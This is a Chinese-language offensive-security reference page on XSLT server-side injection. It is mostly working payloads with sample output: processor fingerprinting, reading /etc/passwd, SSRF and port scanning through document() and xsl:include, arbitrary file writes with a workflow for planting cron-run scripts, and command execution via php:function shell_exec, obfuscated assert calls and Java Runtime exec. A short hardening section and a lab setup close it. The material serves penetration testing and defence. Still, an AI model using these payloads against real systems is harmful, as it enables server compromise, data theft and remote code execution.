---
attack_surface: [注入类, 配置缺陷]
impact: [远程代码执行, 信息泄露, 完整性破坏]
risk_level: 严重
prerequisites: [XML 基础, XPath 语法]
related_techniques: [xxe, esi-injection, ssrf]
difficulty: 中级
tools: [saxon, burp-suite]
---

# XSLT Server Side Injection — XSLT 服务端注入
> 关联文档：[XXE](../../User%20input/Structured%20objects/XXE/README.md) · [ESI Injection](../Server%20Side%20Inclusion%26Edge%20Side%20Inclusion/README.md) · [SAML Attacks](../../External%20Identity%20Management/SAML%20Attacks/README.md)

---

# 0x01 原理与分类

## 1.1 攻击面总览

XSLT（Extensible Stylesheet Language Transformations）是一种用于将 XML 文档转换为 HTML、XML 或纯文本格式的声明式语言。转换过程由 **XSLT 处理器**在服务端（或浏览器端）完成，目前存在三个版本：1.0、2.0 和 3.0，其中 1.0 使用最为广泛。

三个最常见的处理器实现：

- **Libxslt** — Gnome 项目，PHP 中通过 `php_xsl` 扩展默认使用
- **Xalan** — Apache 项目，Java/.NET 生态常见
- **Saxon** — Saxonica 公司产品，支持 XSLT 2.0/3.0，Java/.NET 可用

**漏洞前提**：应用程序允许攻击者控制 XSL 样式表内容——典型场景包括上传 `.xsl`/`.xslt` 文件、在 ESI 标签中指定外部样式表 URL、或通过用户输入拼接到 XSL 模板中。当 XSLT 处理器解析攻击者构造的样式表时，内嵌的恶意指令（`document()`、`unparsed-text()`、`php:function()`、`xsl:include` 等）会在服务端执行。

> **注意**：XSLT 注入不等同于 [XXE](../../User%20input/Structured%20objects/XXE/README.md)。虽然两者都涉及 XML 处理，但 XSLT 注入的攻击面来自 XSLT 处理器自身的扩展函数和指令集，即便 XML 解析器已禁用外部实体（`resolve_entities=False`、`no_network=True`），XSLT 处理器的危险功能仍可能独立生效。

## 1.2 Parser Asymmetry：XML 已加固，XSLT 仍可攻击

部分应用仅加固了**输入 XML** 的解析器，但未加固**样式表**解析器。以 Python lxml 为例：

```python
# XML 解析器已加固
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
```

即使设置了上述选项阻止经典 XXE，XSLT 转换仍可能以默认配置或启用扩展功能的方式解析。这意味着：

- XML 文档中的 [XXE](../../User%20input/Structured%20objects/XXE/README.md) payload 可能失败
- XSLT 特有功能（`system-property()`、`document()`、扩展函数、EXSLT 元素）仍可触达

**实战建议**：若 XXE payload 测试失败，先指纹识别 XSLT 处理器版本，再切换到处理器专属 payload，不要因 XML 解析器结果而中止测试。

## 1.3 版本差异

不同 XSLT 版本可用的函数集不同：

- [XSLT 1.0 规范](https://www.w3.org/TR/xslt-10/)
- [XSLT 2.0 规范](https://www.w3.org/TR/xslt20/)
- [XSLT 3.0 规范](https://www.w3.org/TR/xslt-30/)

---

# 0x02 检测 / 指纹识别

## 2.1 system-property() 指纹

识别处理器版本是构造 payload 的前提——扩展函数（尤其是 RCE 相关函数）高度依赖厂商实现。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```

执行示例（Saxon）：

```xml
$ saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```

## 2.2 爆破检测字典

若无法直接获取处理器指纹，使用 XSLT 专属字典进行模糊测试：

- [Auto_Wordlists/xslt.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt)

---

# 0x03 任意文件读取

## 3.1 unparsed-text() — XSLT 2.0+

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 3.2 document() 函数

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

> **限制**：`document()` 通常期望目标文件为合法 XML。在 **libxslt** 上尝试读取 `/etc/passwd` 等非 XML 文件时通常会报错。此特性在鉴别目标时有用：`document('/etc/passwd')` 失败不意味着 XSLT 处理器已加固，仅说明文件非 XML 格式。
>
> - `document('/path/to/file.xml')` — 若目标是合法 XML，可能成功
> - `document('/etc/passwd')` — 常见报错，因为 `/etc/passwd` 不是 XML

## 3.3 经典 XXE 方式

结合 [XXE](../../User%20input/Structured%20objects/XXE/README.md) 的 DTD 实体注入，可在 XSLT 样式表中内嵌外部实体声明读取本地文件：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```

```xml
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```

## 3.4 通过 HTTP 读取

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

## 3.5 php:function — PHP 环境

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

**进阶 — assert + 编码绕过：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
        <br />
    </body>
</html>
```

---

# 0x04 SSRF 与端口扫描

## 4.1 xsl:include SSRF

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

## 4.2 ESI 标签 SSRF

结合 [ESI Injection](../Server%20Side%20Inclusion%26Edge%20Side%20Inclusion/README.md) 的 `esi:include` 标签，可通过 `stylesheet` 属性加载远程 XSL 实现 SSRF：

```xml
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```

## 4.3 document() 端口扫描

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```

> **注意**：`document()` 的超时或错误响应可用于推断端口开放状态，结合时间差可进行端口扫描。

---

# 0x05 任意文件写入

## 5.1 xsl:result-document — XSLT 2.0 (Saxon)

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```

## 5.2 Xalan-J 扩展 — redirect

```xml
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```

## 5.3 libxslt / EXSLT — exsl:document

若指纹识别确认为 **libxslt**（`system-property('xsl:vendor')` 返回 libxslt），且应用允许上传攻击者控制的 XSLT，可测试 **EXSLT 次要输出**。`exsl:document` 可将新文档写入 XSLT 进程可写的任意路径。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/html/test.txt" method="text">
0xdf was here!
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

**实战工作流**：

1. 先写入标记文件到 **Web 可访问路径**（如 `/var/www/html/test.txt`），确认写入原语可用
2. 再写入**执行入口**——cron 轮询脚本目录、解析器自动重载路径、或其他计划任务输入路径

> **警告 — XML 编码陷阱**：通过 XML 生成 shell payload 时，使用的是 XML 编码而非 URL 编码。例如用 `&amp;` 在写入文件中生成字面量 `&`。直接写 `%26` 会原样保留 `%26`，破坏 shell 重定向语法。

---

# 0x06 远程 XSL 包含

## 6.1 xsl:include — 服务端包含

用于在 XSL 文件内部引用外部模块，可将复杂 RCE payload 托管在攻击者服务器上，绕过本地文件限制。此技术与 [ESI Injection](../Server%20Side%20Inclusion%26Edge%20Side%20Inclusion/README.md) 组合可实现在 ESI 标签中指定外部样式表，扩大攻击面。

```xml
<xsl:include href="http://extenal.web/external.xsl"/>
```

## 6.2 xml-stylesheet 处理指令

在 XML 文档头部声明，诱导处理器或浏览器加载远程样式表。

```xml
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```

---

# 0x07 远程代码执行

## 7.1 PHP 环境 — php:function

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

**进阶 — assert 隐蔽执行：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```

## 7.2 PHP 类静态方法调用

标准的 `php:function` 不仅可调用 PHP 内置函数，还能通过 `类名::方法名` 语法调用当前 PHP 环境中已加载的任意类的**静态方法**。

- **语法格式**：`php:function('ClassName::methodName', 'arg1', 'arg2')`
- **绕过意义**：若 WAF 拦截 `system` / `shell_exec`，但未拦截 `YourCustomClass::runCommand`
- **业务利用**：直接调用后端权限验证类、配置解析类或缓存清理类

```xml
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-àÔ|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```

(示例来源：[http://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls](http://laurent.bientz.com/Blog/Entry/Item/using_php_functions_in_xsl-7.sls))

## 7.3 Java 环境 — Xalan / Saxon

| 环境 | 处理器 | 调用语法 |
|------|--------|---------|
| PHP | Libxslt | `php:function('ClassName::method')` |
| Java | Xalan | `xmlns:myClass="http://xml.apache.org/xalan/java/java.lang.Runtime"` `myClass:getRuntime()` |
| Java | Saxon | `xmlns:rt="java:java.lang.Runtime"` `rt:exec(rt:getRuntime(), 'whoami')` |

## 7.4 其他语言 RCE 参考

Fortify 提供了 C#、Java、PHP 等语言的 XSLT 注入 RCE 示例：

- [https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#C%23%2FVB.NET%2FASP.NET](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#C%23%2FVB.NET%2FASP.NET)

---

# 0x08 目录列举（PHP）

## 8.1 opendir + readdir

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```

## 8.2 assert + scandir

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
        <br />
    </body>
</html>
```

---

# 0x09 XSS 与客户端利用

当 XSLT 转换结果直接输出到浏览器且未做输出编码时，可注入 JavaScript。

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```

> **注意**：此技术的前提是 XSLT 转换结果直接嵌入 HTML 页面。若输出经过上下文编码，此攻击面通常闭合。

---

# 0x0A 防御、检测与工具

## A.1 检测方法论

1. **指纹优先**：先使用 `system-property()` 识别处理器和版本
2. **逐层测试**：XXE → document() → unparsed-text() → php:function / Java 扩展 → EXSLT
3. **Parser asymmetry 测试**：XML 解析器失败不代表 XSLT 处理器安全，必须独立测试样式表解析路径
4. **爆破策略**：使用 [xslt.txt 字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt) 进行模糊注入点探测

## A.2 加固建议

1. **禁用扩展函数**：在处理器配置中显式关闭 PHP/Java 函数调用
   - PHP：禁用 `php:function` 命名空间
   - Java：禁止 Xalan/Saxon 的 Java 扩展机制
2. **禁用外部资源**：关闭 `document()` 和 `xsl:include` 的外部 URL 加载
3. **输入白名单**：不允许用户输入直接拼接到 XSL 模板内容
4. **输出编码**：对 XSLT 转换结果进行上下文相关的输出编码，防止 XSS
5. **最小权限**：XSLT 进程以最低权限运行，限制文件系统访问范围
6. **审计重点**：政务/金融报表系统（常涉及 XML 转 PDF）的导出功能需重点测试 XSLT 注入

## A.3 工具与资源

- [PayloadsAllTheThings — XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection) — 综合 payload 合集
- [PayloadsAllTheThings — XSLT Injection (Web)](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/)
- [Fortify — XSLT Injection 详情](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection) — C#/Java/PHP 多语言 RCE
- [EXSLT — exsl:document 规范](https://exslt.github.io/exsl/elements/document/index.html)
- [lxml API — XMLParser](https://lxml.de/api/lxml.etree.XMLParser-class.html) — parser asymmetry 参考

## A.4 本地复现环境

```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```

测试 XML 数据文件 (`xml.xml`)：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
    <cd>
        <title>CD Title</title>
        <artist>The artist</artist>
        <company>Da Company</company>
        <price>10000</price>
        <year>1760</year>
    </cd>
</catalog>
```

测试 XSL 样式表 (`xsl.xsl`)：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
    <html>
    <body>
    <h2>The Super title</h2>
    <table border="1">
        <tr bgcolor="#9acd32">
            <th>Title</th>
            <th>artist</th>
        </tr>
        <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
        </tr>
    </table>
    </body>
    </html>
</xsl:template>
</xsl:stylesheet>
```

执行：

```bash
saxonb-xslt -xsl:xsl.xsl xml.xml
```

---

## 知识路径

```
XSLT Server Side Injection（本文档）
  ├── 前置知识：XML 基础 · XPath 语法
  ├── 相关：XXE — XML External Entity
  ├── 相关：ESI Injection — Edge Side Inclusion
  ├── 下一步：SAML Attacks — XML 签名与断言处理
  └── 相关：SSRF — 结合 document() 与 xsl:include 的内网探测
```

---

## 参考资料

- [XSLT_SSRF (PDF)](https://feelsec.info/wp-content/uploads/2018/11/XSLT_SSRF.pdf)
- [Abusing XSLT for Practical Attacks — Arnaboldi — IO Active (PDF)](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf)
- [Abusing XSLT for Practical Attacks — Arnaboldi — Blackhat 2015 (PDF)](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20Blackhat%202015.pdf)
- [0xdf — HTB Conversor](https://0xdf.gitlab.io/2026/03/21/htb-conversor.html)
- [GoSecure — ESI Injection Part 2: Abusing Specific Implementations](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
- [XSLT 1.0 规范](https://www.w3.org/TR/xslt-10/)
- [XSLT 2.0 规范](https://www.w3.org/TR/xslt20/)
- [XSLT 3.0 规范](https://www.w3.org/TR/xslt-30/)
